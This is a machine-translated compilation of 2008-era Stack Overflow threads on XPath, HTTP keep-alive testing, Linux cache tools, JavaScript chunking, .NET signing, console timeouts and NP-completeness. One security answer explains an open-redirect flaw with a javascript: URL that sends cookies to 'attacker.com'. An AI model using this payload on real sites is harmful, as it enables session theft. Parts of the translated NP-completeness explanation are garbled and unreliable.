上个月我们刚刚完成升级。我没有注意到减速 - 但我们从一开始就一直在运行 SP1。我们错误地安装了 SP1 的测试版（服务包的测试版？！？！）并且必须在安装 RTM SP1 之前下载并运行一个特殊的工具来删除它，但这不应该影响您。最大的痛苦是为 2008 年构建我们所有的第三方库，并为我们的一个客户建立一个批处理来将我们的项目和解决方案反向转换到 2005 年。关于库 - 微软说如果它在公共接口中有任何 C++，或者在内部使用 STL，那么它需要用新的编译器重新构建。[我在我的博客](http://brianstewart.wordpress.com/2008/08/29/upgrading-to-visual-studio-2008/)上写了一个小概要。

编辑：这是我们使用[的项目转换器](http://home.hot.rr.com/graye/Articles/ProjectConverter.htm)。我将它转换为我们的批处理的命令行应用程序，它工作得很好。

# c# - 检查 XML 中的空子节点的最佳方法？

> ID：210787
> 
> 赞同：4
> 
> 时间：2008-10-17T01:03:25.747
> 
> 标签：c#, xml

我有一个最大 3 级深度的 xml。现在通过使用 C# 或 Xpath 检查父节点下的所有子节点是否为空的最佳方法是什么。

提前致谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2008-10-17T01:21:06.710

给定一个示例文档：

```
<foo>
  <bar>
    <baz/>
    <baz>Hello, world!</baz>
    <baz><qux/></baz>
  </bar>
</foo> 
```

这个表达式告诉你哪些`foo/bar`子元素有任何子元素：

```
foo/bar/*[count(*)>0] 
```

此表达式告诉您哪些`foo/bar`子节点有任何子文本节点：

```
foo/bar/*[text()] 
```

因此，要确保所有子元素都是空的（没有子元素或文本节点），请确保此表达式返回 true：

```
not(foo/bar/*[count(*)>0 or text()]) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-10-17T01:31:42.150

此 LINQ to XML 查询应该接近您所追求的：

```
 XElement xml = new XElement("contacts",
  new XElement("contact",
    new XAttribute("contactId", ""),
    new XElement("firstName", ""),
    new XElement("lastName", ""),
    new XElement("Address",
        new XElement("Street", ""))
    ),

new XElement("contact",
  new XAttribute("contactId", ""),
  new XElement("firstName", ""),
  new XElement("lastName", "")
   )
 );

var query = from c in xml.Elements()
  where c.Value != ""
  select c;

Console.WriteLine(xml);
Console.WriteLine(query.Count()); 当查询计数 == 0 时，您没有包含内容的元素。

根据您所追求的以及如果您对 LINQ 样式操作没有其他用途，发布的 xPath 解决方案可能更合适。

        http - 如何在 HTTP 服务器中测试持久连接？

ID：210789

赞同：7

时间：2008-10-17T01:05:07.210

标签：http

在构建小型实验性 HTTP 服务器时，我需要实现 HTTP 1.1 的持久连接功能（以及流水线功能）。我该如何测试它？使用像 Firefox 这样的浏览器让我几乎没有控制权，而且很难检查。有任何想法吗？

谢谢

            回答 #1

赞同：1

时间：2008-10-17T01:21:45.507

curl( [http://curl.haxx.se/](http://curl.haxx.se/) ) -- 让您可以很好地控制 GET/POST 和许多其他属性。

curl 还带有 libcurl，因此您可以以编程方式执行操作。

Perl 和 python（urllib 或 urllib2）将帮助您到达那里。

            回答 #2

赞同：1

时间：2008-10-17T02:45:57.990

[ab](http://httpd.apache.org/docs/2.0/programs/ab.html)或 ApacheBench 是 HTTP 服务器的命令行基准。该`-k`选项使其使用 KeepAlive。

            回答 #3

赞同：0

时间：2008-10-17T23:06:16.683

网猫。您可以输入请求并查看来自服务器的响应。如果你知道 HTTP 协议，那根本不是问题。事实上，它比 curl 或其他更高级别的库/应用程序更好，因为在这里您可以发送您喜欢的任何内容（格式错误的请求）并测试服务器行为中的极端情况。您还可以重定向输入（和输出），这在您想要测试 HTTP/1.1 请求管道时特别有用。请记住，在 Unix 中使用 Netcat 发送 CRLF 比在 Windows 上更难，在 Windows 中您只需按 Enter。

        linux - 如何判断文件是否缓存在 linux 的内存中？

ID：210809

赞同：11

时间：2008-10-17T01:16:59.293

标签：linux, file, memory, caching

基本上我的问题是，有没有人知道用于检查linux中的**缓冲区缓存的实用程序？**

            回答 #1

赞同：9

时间：2013-08-23T09:05:19.387

看看[linux-ftools](http://code.google.com/p/linux-ftools/)。这套工具专门用于分析缓冲区和缓存。它包括以下工具：

*   fincore
*   时尚
*   分配

在这 3 个工具中，可以显示缓冲区和缓存中文件列表的工具是`fincore`.

```
$ fincore [options] files...

  --pages=false      Do not print pages
  --summarize        When comparing multiple files, print a summary report
  --only-cached      Only print stats for files that are actually in cache.

root@xxxxxx:/var/lib/mysql/blogindex# fincore --pages=false --summarize --only-cached * 
stats for CLUSTER_LOG_2010_05_21.MYI: file size=93840384 , total pages=22910 , cached pages=1 , cached size=4096, cached perc=0.004365 
stats for CLUSTER_LOG_2010_05_22.MYI: file size=417792 , total pages=102 , cached pages=1 , cached size=4096, cached perc=0.980392 
stats for CLUSTER_LOG_2010_05_23.MYI: file size=826368 , total pages=201 , cached pages=1 , cached size=4096, cached perc=0.497512 
stats for CLUSTER_LOG_2010_05_24.MYI: file size=192512 , total pages=47 , cached pages=1 , cached size=4096, cached perc=2.127660 
... 
```

            回答 #2

赞同：2

时间：2014-11-11T08:12:06.537

我不完全确定您是否在问我认为您在问什么，但[vmtouch](http://hoytech.com/vmtouch/)可能对您有所帮助。只需键入`vmtouch [file or folder you want to check for presence in cache]`

        html - 你能在这里找到网络安全问题吗？

ID：210820

赞同：2

时间：2008-10-17T01:20:34.277

标签：html, security, xss, exploit

我有一个网页重定向到另一个网页，如下所示：

```
http://www.myOtherServer.com/Sponsor.php?RedirectPage=http://mylink.com/whereIwasgoingtogo.html 
```

然后，Sponsor.php 页面会显示一个广告，其中包含一个“继续到您的页面”链接，该链接指向传入的 RedirectPage。是否存在可能由此产生的安全/欺骗问题？处理这个问题的最佳方法是什么？（请注意，用户没有登录到任何一个站点）

            回答 #1

赞同：10

时间：2009-07-06T20:37:38.620

这是个大问题。如果我向您发送如下所示的链接：

```
 http://cnn.com/sponsor.php?redirectpage=http://bit.ly/jh2l14 
```

你会想“哦，CNN，这是一个合法的网站”，然后你会打开它并点击“继续你的页面”链接。然后你会在网上最讨厌的色情网站之一上，它会有一个巨大的男性声音向你所有的同事宣布**“我想要！@$@#$ 你的！（&¤ &^$§ 直到我不能 ¡⌐^(!#~~&$^#!@$!!** " 你必须向你的老板解释 "我以为是 CNN！"

这里的洞是*你的名声*。像这样的盲目重定向是危险的。

这只是一个洞。这个怎么样？

```
 http://cnn.com/sponsor.php?redirectpage=javascript:location.href='http://attacker.com/' + document.cookie 
```

Now I've XSS-ed your site and stolen your user's cookies.  Sure, you say there's no login info, but how about session data?  Or when you add a login later, or someone else in your company uses this page a year later where users are logged in.

            回答 #2

赞同：0

时间：2008-10-17T01:45:15.600

这绝对是一个安全风险。当涉及安全性时，您应该避免使用 URL 内变量。

虽然没有什么是完全安全的，但这是处理此问题的更好方法：[http ://www.webmasterworld.com/forum88/2910.htm](http://www.webmasterworld.com/forum88/2910.htm)

            回答 #3

赞同：0

时间：2008-10-17T01:46:52.960

如果赞助商.php 允许任何值进入 RedirectPage 并且广告暗示背书，或者鼓励人们认为他们走在正确的轨道上，那么您将打开它成为网络钓鱼攻击的一部分。更糟糕的是，您可能会从这些攻击中获利，这可能会让人们相当不高兴。

保留允许的 URL 列表（或它们可以遵循的模式）将大大有助于防止出现问题。

        javascript - 在密集的 JavaScript 处理过程中，如何将控制权（简单地）交还给浏览器？

ID：210821

赞同：26

时间：2008-10-17T01:20:47.863

标签：javascript, jquery

我在[这里](http://www.julienlecomte.net/blog/2007/10/28/)阅读了有关在密集 DOM 处理期间使用 setTimeout() 的帖子（使用 JavaScript），但是如何将此函数与以下代码集成？The below code works fine for a small number of options, but when the number of options gets too big my "please wait" animated GIF freezes while the local JavaScript is processing. 谢谢！

```
function appendToSelect() {
    $("#mySelect").children().remove() ;
    $("#mySelect").html(
        '<option selected value="' + obj.data[0].value + '">'
        + obj.data[0].name
        + '</option>'
    );
    var j = 1 ;
    for (var i = 1; i < obj.data.length; i++) {
        $("#mySelect").append(
            '<option value="' + obj.data[i].value + '">'
            + obj.data[i].name
            + '</option>'
        ); 
    }
} 
```

            回答 #1

赞同：29

时间：2008-10-17T03:16:50.690

这是一个解决方案：

```
function appendToSelect() {
  $("#mySelect").children().remove();
  $("#mySelect").html(
    '<option selected value="'+obj.data[0].value+'">'
    + obj.data[0].name
    + '</option>'
  );
  obj.data.splice(0, 1); // we only want remaining data
  var appendOptions = function() {
    var dataChunk = obj.data.splice(0, 10); // configure this last number (the size of the 'chunk') to suit your needs
    for(var i = 0; i < dataChunk.length; i++) {
      $("#mySelect").append(
        '<option value="' + dataChunk[i].value + '">'
        + dataChunk[i].name
        + '</option>'
      );
    }
    if(obj.data.length > 0) {
      setTimeout(appendOptions, 100); // change time to suit needs
    }
  };
  appendOptions(); // kicks it off
} 
```

不像[@Borgar 的](https://stackoverflow.com/questions/210821/giving-brief-control-back-to-the-browser-during-intensive-javascript-processing#210968)解决方案那么优雅，但你明白了。基本上，我在做同样的事情，但都在你的一个函数中，而不是像他那样把它分解成一个高阶函数。我喜欢他的解决方案，但如果你不这样做，也许这对你有用。

EDIT: For those that don't immediately see it, one of the main differences between this solution and [@Borgar's](https://stackoverflow.com/questions/210821/giving-brief-control-back-to-the-browser-during-intensive-javascript-processing#210968) is that this solution allows you to set the size of the 'chunks' of data that is processed between each timeout. [@Borgar's](https://stackoverflow.com/questions/210821/giving-brief-control-back-to-the-browser-during-intensive-javascript-processing#210968) times-out after *every single member* of the array is processed. If I get time, I will try to create a higher-order function to handle this so it is more elegant. No promises though! ;)

EDIT: So, here is my adaptation of [@Borgar's](https://stackoverflow.com/questions/210821/giving-brief-control-back-to-the-browser-during-intensive-javascript-processing#210968) solution, which allows for setting a 'chunk' size and configuring the timeout value more easily:

```
function incrementallyProcess(workerCallback, data, chunkSize, timeout, completionCallback) {
  var itemIndex = 0;
  (function() {
    var remainingDataLength = (data.length - itemIndex);
    var currentChunkSize = (remainingDataLength >= chunkSize) ? chunkSize : remainingDataLength;
    if(itemIndex < data.length) {
      while(currentChunkSize--) {
        workerCallback(data[itemIndex++]);
      }
      setTimeout(arguments.callee, timeout);
    } else if(completionCallback) {
      completionCallback();
    }
  })();
}

function appendToSelect() {
  $("#mySelect").children().remove();
  $("#mySelect").html(
    '<option selected value="' + obj.data[0].value + '">'
    + obj.data[0].name
    + '</option>'
  );
  obj.data.splice(0,1); // we only want remaining data      
  incrementallyProcess(function(data) {
    $("#mySelect").append(
    '<option value="' + data.value + '">'
    + data.name
    + '</option>'
   );
  }, obj.data, 10, 100, removeAnimatedGifFunction); // last function not required...
} 
```

Hope that helps - I think this combines the best of both solutions. **Notice**, the second anonymous function no longer uses the index value, but simply passes in the entire object (with the value and name properties); that makes it a bit cleaner, since the index of the current object really isn't *usually* that useful when iterating over things, IMO.

I am sure there are still things that could be done to make this even better, but that is left as an exercise for the reader. ;)

            回答 #2

赞同：20

时间：2008-10-17T02:54:04.993

碰巧我刚才[在这里](https://stackoverflow.com/questions/205631/javascript-loadingbusy-indicator-or-transparent-div-over-page-on-event-click#210931)发布了这个。这是一个定时循环功能：

```
function processLoop( actionFunc, numTimes, doneFunc ) {
  var i = 0;
  var f = function () {
    if (i < numTimes) {
      actionFunc( i++ );  // closure on i
      setTimeout( f, 10 )
    } 
    else if (doneFunc) { 
      doneFunc();
    }
  };
  f();
} 
```

对于您的情况，这将像这样使用：

```
function appendToSelect () {

  $("#mySelect").children().remove() ;
  $("#mySelect").html(
      '<option selected value="' + obj.data[0].value + '">'
      + obj.data[0].name
      + '</option>'
  );
  var j = 1 ;

  processLoop(function (i){
    $("#mySelect").append(
        '<option value="' + obj.data[i].value + '">'
        + obj.data[i].name
        + '</option>'
    ); 
  }, obj.data.length);

} 
```

您需要确保对迭代函数中的 obj 变量具有闭包或其他访问权限。

希望这可以帮助。

            回答 #3

赞同：4

时间：2009-10-22T21:22:45.200

If you need something simpler, I wrote a jQuery plugin to ease writing of asynchronous loops: [jQuery Async](http://mess.genezys.net/jquery/jquery.async.php).

Using the plugin, your code can be rewritten as:

```
function appendToSelect() {
    $("#mySelect").children().remove() ;
    $("#mySelect").html(
        '<option selected value="' + obj.data[0].value + '">'
        + obj.data[0].name
        + '</option>'
    );

    /////////////////////////////
    var i = 1;
    $.whileAsync({
        test: function(){ i < obj.data.length; }
        loop: function()
        {
            $("#mySelect").append(
                '<option value="' + obj.data[i].value + '">'
                + obj.data[i].name
                + '</option>'
            ); 
            i++;
        }
    });
    /////////////////////////////
} 
```

Should help the responsiveness. Tweak the 'bulk' and 'delay' option for more control.

            回答 #4

赞同：-1

时间：2008-10-17T01:33:49.273

您需要重写该函数以缓存元素列表，然后使用某种计数器遍历列表。

然后当计数器达到计数器 % max_num_before_wait == 0 时，将超时回调函数本身。

确保清除完整列表末尾的缓存和计数器，或使用带有额外计数参数的辅助函数。

        .net - 程序集“未正确签名”。警告

ID：210826

赞同：4

时间：2008-10-17T01:22:42.463

标签：.net, .net-2.0, assemblies, code-signing

我有一个移动 .NET 解决方案，并决定签署程序集。编译完成没有错误，但给出警告

**'CompactUI.Business.PocketPC.asmmeta, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null' 未正确签名。**

该应用程序运行良好，但我无法再打开使用此程序集的表单设计器。设计师又说

**'CompactUI.Business.PocketPC.asmmeta, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null' 未正确签名。** 

堆栈信息：    

在 Microsoft.CompactFramework.Build.AsmmetaBindingService.GetAsmmetaAssembly(String sourceAssemblyPath, Boolean verify) 在 Microsoft.CompactFramework.Build.AsmmetaBindingService.LoadAsmMetaAssembly(Assembly sourceAssembly, String hintPath, IDeviceTypeResolutionService resolver) 在 Microsoft.CompactFramework.Build.MetadataService.GetAsmmetaType(Type sourceType ) 在 Microsoft.CompactFramework.Build.MetadataService.GetTypeAttributes(Type desktopType) 在 Microsoft.CompactFramework.Design.DeviceCustomTypeDescriptor.GetAttributes() ...

这是什么原因造成的？

**编辑：尼古拉斯的建议并没有解决问题**

我有一个包含通用属性的表单，这些属性是表示层中每个表单的基础

```
public class CustomForm : Form
{
    ...
} 
```

此表单位于导致警告的业务层中。在设计器中查看时，从该基本表单继承的每个表单都会导致问题。

            回答 #1

赞同：1

时间：2008-10-22T02:53:13.993

验证程序集不是使用“延迟符号”设置生成的。这将导致程序集宣传它已签名，而它只有一个`null`占位符。这将导致强名称验证失败。有关更多信息，您还可以查看 MSDN 上的此页面：“程序[集应具有有效的强名称](http://msdn.microsoft.com/en-us/library/ms182127.aspx)”

            回答 #2

赞同：0

时间：2008-10-21T17:55:14.143

我很困惑，你说你签署了程序集，但你的公钥令牌为空，如果你已经签署了这个程序集，那么你应该指定生成的公钥而不是 null。也许我没有完全理解这个问题。尝试删除对 CompactUI.Business.PocketPC.asmmeta 的引用并重新添加签名版本。

            回答 #3

赞同：-2

时间：2008-10-22T10:04:20.927

原因

程序集未使用强名称进行签名，无法验证强名称，或者如果没有计算机的当前注册表设置，强名称将无效。规则说明

此规则检索并验证程序集的强名称。如果以下任何一项为真，则会发生违规行为：

```
* The assembly does not have a strong name.

* The assembly was altered after signing.

* The assembly is delay-signed.

* The assembly was incorrectly signed, or signing failed.

* The assembly requires registry settings to pass verification. For example, the Strong Name tool (Sn.exe) was used to skip verification for the assembly. 
```

强名称可防止客户端在不知不觉中加载已被篡改的程序集。不应该在非常有限的场景之外部署没有强名称的程序集。如果您共享或分发未正确签名的程序集，则程序集可能会被篡改，公共语言运行时可能不会加载程序集，或者用户可能必须在他或她的计算机上禁用验证。没有强名称的程序集存在以下缺点：

```
* Its origins cannot be verified.

* The common language runtime cannot warn users if the contents of the assembly have been altered.

* It cannot be loaded into the global assembly cache. 
```

请注意，要加载和分析延迟签名的程序集，您必须禁用程序集的验证。

        c# - 如何在 C# 中等待控制台输入 15 秒左右

ID：210827

赞同：8

时间：2008-10-17T01:24:56.390

标签：c#, multithreading, user-input, sleep

我需要在控制台中请求输入并等待几秒钟可能是一分钟之后我需要默认为某个值。基本上如何在 c# 中为我们的控制台输入计时并继续使用默认设置？如果您有示例代码，那就太好了。

            回答 #1

赞同：3

时间：2008-10-17T01:36:44.150

您可以使用 System.Timers.Timer 中的计时器对象并将其设置为 60 秒，启用它，如果有人在控制台中输入某些内容，则将其禁用，如果没有，则只需处理 Timer.Elapsed 事件中发生的事情。

```
static void Main(string[] args)
        {
            System.Timers.Timer timer = new System.Timers.Timer(60000);
            timer.Elapsed += new System.Timers.ElapsedEventHandler(T_Elapsed);
            timer.Start();
            var i = Console.ReadLine();
            if (string.IsNullOrEmpty(i)) 
            {
                timer.Stop();
                Console.WriteLine("{0}", i);
            }
        }

        static void T_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            Console.WriteLine("Defult Values Used");
            var T = (Timer)sender;
            T.Stop;

        } 
```

不确定这是否是最好的方法。我已经对此进行了测试，但正如我所说，这可能不是最好的方法。

            回答 #2

赞同：2

时间：2008-10-17T14:15:03.590

您可能需要考虑执行类似添加命令行参数的操作，以充当使用默认值的自动模式和完整用户输入模式之间的切换。

如果您对您的请求使用特定的解释，它变得非常微不足道。在这个模型中，用户被提示输入。如果他们在超时后没有输入任何内容，则使用默认值。如果他们开始输入内容，则不使用超时。这也解决了当他们需要很长时间输入内容时放弃和使用默认值的可用性问题。

```
 static void Main(string[] args)
    {
        Console.WriteLine("Please enter your name ");
        string input;

        if (TryReadLine(out input, 10000, true))
        {
            Console.WriteLine(input);
        }
        else
        {
            Console.WriteLine("[DEFAULT]");
        }

        Console.ReadKey(true);
    }

    const string timerString = "[{0} seconds until default value is used]";

    public static bool TryReadLine(out string s, double timeout, bool showTimer)
    {
        DateTime timeoutDateTime = DateTime.Now.AddMilliseconds(10000);
        DateTime nextTimer = DateTime.Now;
        while (DateTime.Now < timeoutDateTime)
        {
            if (Console.KeyAvailable)
            {
                ClearTimer(timeoutDateTime);
                s = Console.ReadLine();
                return true;
            }

            if (showTimer && DateTime.Now > nextTimer)
            {
                WriteTimer(string.Format(timerString, (timeoutDateTime - DateTime.Now).Seconds));
                nextTimer = DateTime.Now.AddSeconds(1);
            }
        }

        ClearTimer(timeoutDateTime);
        s = null;
        return false;
    }

    private static void ClearTimer(DateTime timeoutDateTime)
    {
        WriteTimer(new string(' ', string.Format(timerString, (timeoutDateTime - DateTime.Now).Seconds).Length));
    }

    private static void WriteTimer(string s)
    {
        int cursorLeft = Console.CursorLeft;
        Console.CursorLeft = 0;
        Console.CursorTop += 1;
        Console.Write(s);
        Console.CursorLeft = cursorLeft;
        Console.CursorTop -= 1;
    }
} 
```

因为我花了很长时间才意识到有更好的方法，所以这是我刚刚敲出的一些代码，用于从控制台读取一个字符串，超时。它还可以选择将当前时间打印到控制台。它没有经过非常彻底的测试，因此可能有很多错误。回调功能使用 .NET 3.0 Action，但如果这是针对 C# 2.0 的，您可以将其转换为委托。

```
 static void Main(string[] args)
    {
        string input;
        Console.Write("Please enter your name (");
        int timerPromptStart = Console.CursorLeft;
        Console.Write("    seconds left): ");
        if (TryReadLine(out input, 10000, delegate(TimeSpan timeSpan)
                                          {
                                              int inputPos = Console.CursorLeft;
                                              Console.CursorLeft = timerPromptStart;
                                              Console.Write(timeSpan.Seconds.ToString("000"));
                                              Console.CursorLeft = inputPos;
                                          },
                                          1000))
        {
            Console.WriteLine(input);
        }
        else
        {
            Console.WriteLine("DEFAULT");
        }
        while (true) { }
    }

    /// <summary>
    /// Tries to read a line of input from the Console.
    /// </summary>
    /// <param name="s">The string to put the input into.</param>
    /// <param name="timeout">The time in milliseconds before the attempt fails.</param>
    /// <returns>Whether the user inputted a line before the timeout.</returns>
    public static bool TryReadLine(out string s, double timeout)
    {
        return TryReadLine(out s, timeout, null, 0);
    }

    /// <summary>
    /// Tries to read a line of input from the Console.
    /// </summary>
    /// <param name="s">The string to put the input into.</param>
    /// <param name="timeout">The time in milliseconds before the attempt fails.</param>
    /// <param name="timerCallback">A function to call every callbackInterval.</param>
    /// <param name="callbackInterval">The length of time between calls to timerCallback.</param>
    /// <returns>Whether the user inputted a line before the timeout.</returns>
    public static bool TryReadLine(out string s, double timeout, Action<TimeSpan> timerCallback, double callbackInterval)
    {
        const int tabLength = 6;

        StringBuilder inputBuilder = new StringBuilder();
        int readStart = Console.CursorLeft;
        int lastLength = 0;
        bool isInserting = true;
        DateTime endTime = DateTime.Now.AddMilliseconds(timeout);
        DateTime nextCallback = DateTime.Now;
        while (DateTime.Now < endTime)
        {
            if (timerCallback != null && DateTime.Now > nextCallback)
            {
                nextCallback = DateTime.Now.AddMilliseconds(callbackInterval);
                timerCallback((endTime - DateTime.Now));
            }

            if (Console.KeyAvailable)
            {
                ConsoleKeyInfo key = Console.ReadKey(true);
                switch (key.Key)
                {
                    case ConsoleKey.Enter:
                        Console.WriteLine();
                        s = inputBuilder.ToString();
                        return true;

                    case ConsoleKey.Backspace:
                        if (Console.CursorLeft > readStart)
                        {
                            Console.CursorLeft -= 1;
                            inputBuilder.Remove(Console.CursorLeft - readStart, 1);
                        }
                        break;

                    case ConsoleKey.Delete:
                        if (Console.CursorLeft < readStart + inputBuilder.Length)
                        {
                            inputBuilder.Remove(Console.CursorLeft - readStart, 1);
                        }
                        break;

                    case ConsoleKey.Tab:
                        // Tabs are very difficult to handle properly, so we'll simply replace it with spaces.
                        AddOrInsert(inputBuilder, new String(' ', tabLength), isInserting, readStart);
                        Console.CursorLeft += tabLength;
                        break;

                    case ConsoleKey.Escape:
                        Console.CursorLeft = readStart;
                        inputBuilder = new StringBuilder();
                        break;

                    case ConsoleKey.Insert:
                        isInserting = !isInserting;
                        // This may be dependant on a variable somewhere.
                        if (isInserting)
                        {
                            Console.CursorSize = 25;
                        }
                        else
                        {
                            Console.CursorSize = 50;
                        }
                        break;

                    case ConsoleKey.Home:
                        Console.CursorLeft = readStart;
                        break;

                    case ConsoleKey.End:
                        Console.CursorLeft = readStart + inputBuilder.Length;
                        break;

                    case ConsoleKey.LeftArrow:
                        if (Console.CursorLeft > readStart)
                        {
                            Console.CursorLeft -= 1;
                        }
                        break;

                    case ConsoleKey.RightArrow:
                        if (Console.CursorLeft < readStart + inputBuilder.Length)
                        {
                            Console.CursorLeft += 1;
                        }
                        break;

                    case ConsoleKey.UpArrow:
                        // N.B. We can't handle Up like we normally would as we don't know the last console input.
                        //      You might want to handle this so it works appropriately within your own application.
                        break;

                    case ConsoleKey.PageUp:
                    case ConsoleKey.PageDown:
                    case ConsoleKey.PrintScreen:
                    case ConsoleKey.LeftWindows:
                    case ConsoleKey.RightWindows:
                    case ConsoleKey.Sleep:
                    case ConsoleKey.F1:
                    case ConsoleKey.F2:
                    case ConsoleKey.F3:
                    case ConsoleKey.F4:
                    case ConsoleKey.F5:
                    case ConsoleKey.F6:
                    case ConsoleKey.F7:
                    case ConsoleKey.F8:
                    case ConsoleKey.F9:
                    case ConsoleKey.F10:
                    case ConsoleKey.F11:
                    case ConsoleKey.F12:
                    case ConsoleKey.F13:
                    case ConsoleKey.F14:
                    case ConsoleKey.F15:
                    case ConsoleKey.F16:
                    case ConsoleKey.F17:
                    case ConsoleKey.F18:
                    case ConsoleKey.F19:
                    case ConsoleKey.F20:
                    case ConsoleKey.F21:
                    case ConsoleKey.F22:
                    case ConsoleKey.F23:
                    case ConsoleKey.F24:
                    case ConsoleKey.BrowserBack:
                    case ConsoleKey.BrowserForward:
                    case ConsoleKey.BrowserStop:
                    case ConsoleKey.BrowserRefresh:
                    case ConsoleKey.BrowserSearch:
                    case ConsoleKey.BrowserFavorites:
                    case ConsoleKey.BrowserHome:
                    case ConsoleKey.VolumeMute:
                    case ConsoleKey.VolumeUp:
                    case ConsoleKey.VolumeDown:
                    case ConsoleKey.MediaNext:
                    case ConsoleKey.MediaPrevious:
                    case ConsoleKey.MediaStop:
                    case ConsoleKey.MediaPlay:
                    case ConsoleKey.LaunchMail:
                    case ConsoleKey.LaunchMediaSelect:
                    case ConsoleKey.LaunchApp1:
                    case ConsoleKey.LaunchApp2:
                    case ConsoleKey.Play:
                    case ConsoleKey.Zoom:
                    case ConsoleKey.NoName:
                    case ConsoleKey.Pa1:
                        // These keys shouldn't do anything.
                        break;

                    case ConsoleKey.Clear:
                    case ConsoleKey.Pause:
                    case ConsoleKey.Select:
                    case ConsoleKey.Print:
                    case ConsoleKey.Execute:
                    case ConsoleKey.Process:
                    case ConsoleKey.Help:
                    case ConsoleKey.Applications:
                    case ConsoleKey.Packet:
                    case ConsoleKey.Attention:
                    case ConsoleKey.CrSel:
                    case ConsoleKey.ExSel:
                    case ConsoleKey.EraseEndOfFile:
                    case ConsoleKey.OemClear:
                        // I'm not sure what these do.
                        break;

                    default:
                        Console.Write(key.KeyChar);
                        AddOrInsert(inputBuilder, key.KeyChar.ToString(), isInserting, readStart);
                        break;
                }

                // Write what has current been typed in back out to the Console.
                // We write out everything after the cursor to handle cases where the current input string is shorter than before
                // (i.e. the user deleted stuff).
                // There is probably a more efficient way to do this.
                int oldCursorPos = Console.CursorLeft;
                Console.CursorLeft = readStart;
                Console.Write(inputBuilder.ToString());
                if (lastLength > inputBuilder.Length)
                {
                    Console.Write(new String(' ', lastLength - inputBuilder.Length));
                }
                lastLength = inputBuilder.Length;
                Console.CursorLeft = oldCursorPos;
            }
        }

        // The timeout period was reached.
        Console.WriteLine();
        s = null;
        return false;
    }

    // This is a rather ugly helper method to add text to the inputBuilder, either inserting or appending as appropriate.
    private static void AddOrInsert(StringBuilder inputBuilder, string s, bool insert, int readStart)
    {
        if (Console.CursorLeft < readStart + inputBuilder.Length + (insert ? -1 : 1))
        {
            if (!insert)
            {
                inputBuilder.Remove(Console.CursorLeft - 1 - readStart, 1);
            }
            inputBuilder.Insert(Console.CursorLeft - 1 - readStart, s);
        }
        else
        {
            inputBuilder.Append(s);
        }
    }
} 
```

            回答 #3

赞同：2

时间：2008-10-17T01:29:45.740

看[这里](https://stackoverflow.com/questions/57615/how-to-add-a-timeout-to-consolereadline)，它在控制台上使用了一个不错的小轮询技术，虽然有点粗糙，但非常有效。

            回答 #4

赞同：0

时间：2008-10-17T01:29:06.973

一种方法是循环，调用 Console.In.Peek()，等待输入或足够的时间过去。

        algorithm - 什么是计算机科学中的 NP 完全？

ID：210829

赞同：478

时间：2008-10-17T01:25:36.013

标签：algorithm, language-agnostic, mathematical-optimization, theory, np-complete

什么是NP完全问题？为什么它在计算机科学中如此重要？

            回答 #1

赞同：468

时间：2008-11-24T06:09:20.247

什么是[NP](https://en.wikipedia.org/wiki/NP_(complexity))？
NP 是所有[决策问题](https://en.wikipedia.org/wiki/Decision_problem)（带有是或否答案的问题）的集合，其中“是”答案可以在多项式时间 (O(n ^k ) 中得到***验证****，其中n*是问题大小，*k*是常数）通过[确定性图灵机](http://en.wikipedia.org/wiki/Deterministic_Turing_machine)。多项式时间有时被用作*快速*或*快速*的定义。 ***## 什么是[P](https://en.wikipedia.org/wiki/P_(complexity))？

P 是可以在*多项式时间内*由*确定性图灵机***解决**的所有决策问题的集合。由于它们可以在多项式时间内求解，因此它们也可以在多项式时间内得到验证。因此 P 是 NP 的子集。

 **## 什么是[NP 完全](https://en.wikipedia.org/wiki/NP-complete)？

*当且仅当*NP 中的所有其他问题都可以快速（即在多项式时间内）转换为 x 时，NP 中的问题 x 也属于 NP-Complete 。

换句话说：

1.  x 在 NP 中，并且

2.  NP 中的每个问题都可以归[*约为*](https://en.wikipedia.org/wiki/Reduction_(complexity))x

所以，*NP-Complete*之所以如此有趣，是因为如果要快速解决任何一个 NP-Complete 问题，那么所有*NP*问题都可以快速解决。

另见帖子[什么是“P=NP？”，为什么它是一个如此著名的问题？](https://stackoverflow.com/questions/111307/whats-pnp-and-why-is-it-such-a-famous-question)

## 什么是[NP-Hard](https://en.wikipedia.org/wiki/NP-hard)？

NP-Hard 是至少与 NP 中最难的问题一样难的问题。请注意，NP-Complete 问题也是 NP-hard。`NP`然而，尽管有前缀，但并非所有 NP 难题都是 NP（甚至是决策问题） 。也就是说 NP-hard 中的 NP 并不意味着*非确定性多项式时间*。是的，这很令人困惑，但它的使用是根深蒂固的，不太可能改变。

* * *

## 回答 #2

> 赞同：227
> 
>             
> 
> 时间：2008-10-17T01:32:51.677

**NP**代表***非确定性*多项式**时间。

这意味着可以使用非确定性图灵机（类似于常规图灵机，但也包括非确定性“选择”功能）在多项式时间内解决问题。基本上，解决方案必须在多时间内可*测试。*如果是这种情况，并且已知的 NP 问题可以使用修改输入的给定问题来解决（NP 问题可以*简化*为给定问题），那么问题就是 NP 完全的。

一个 NP 完全问题的主要问题是它不能以任何已知的方式在多项式时间内解决。NP-Hard/NP-Complete 是一种表明某些类别的问题在现实时间内无法解决的方法。

编辑：正如其他人所指出的，NP-Complete 问题通常有近似解决方案。在这种情况下，近似解通常使用特殊符号给出近似界，该符号告诉我们近似值有多接近。

* * *

## 回答 #3

> 赞同：36
> 
>             
> 
> 时间：2008-10-17T01:54:25.520

NP-Complete 意味着非常具体的东西，你必须小心，否则你会弄错定义。首先，NP 问题是一个是/否问题，这样

1.  对于问题的每个实例，都有多项式时间证明，答案是“是”，答案是“是”，或者（等效地）

2.  存在一个多项式时间算法（可能使用随机变量），如果问题实例的答案是“是”，则该算法有非零概率回答“是”，并且在 100% 的情况下会说“否”，如果答案是不。” 换句话说，该算法必须具有小于 100% 的误报率并且没有误报。

问题 X 是 NP 完全的，如果

1.  X 在 NP 中，并且

2.  对于 NP 中的任何问题 Y，存在从 Y 到 X 的“归约”：一种多项式时间算法，它将 Y 的任何实例转换为 X 的实例，使得当且仅当 Y 实例的答案为“是”时如果答案 X-instance 是“是”。

如果 X 是 NP 完全的，并且存在可以正确解决 X 的所有实例的确定性多项式时间算法（0% 假阳性，0% 假阴性），则 NP 中的任何问题都可以在确定性多项式中解决时间（通过减少到 X）。

